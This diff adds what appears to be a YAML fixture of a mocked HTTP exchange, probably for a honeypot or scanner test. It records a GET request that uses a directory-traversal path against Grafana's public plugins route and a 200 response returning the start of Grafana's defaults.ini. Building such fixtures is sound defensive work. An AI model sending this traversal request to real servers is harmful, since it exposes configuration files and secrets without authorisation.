@@ -1,0 +1,30 @@
+- method: GET
+  path: "/public/plugins/helpers/wordlists/grafana-plugins.txt/../../../../../conf/defaults.ini"
+  status: 200
+  content-type: text/plain
+  headers:
+    Server: nginx/1.18.0
+  body: |
+    ##################### Grafana Configuration Defaults #####################
+    #
+    # Do not modify this file in grafana installs
+    #
+
+    # possible values : production, development
+    app_mode = production
+
+    # instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
+    instance_name = ${HOSTNAME}
+
+    # Directory where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
+    socket = /tmp/grafana.sock
+
+    [server]
+    # Protocol (http, https, h2, socket)
+    protocol = http
+
+    # The http port to use
+    http_port = 3000
+
+    # The public facing domain name used to access grafana from a browser
+    domain = localhost 
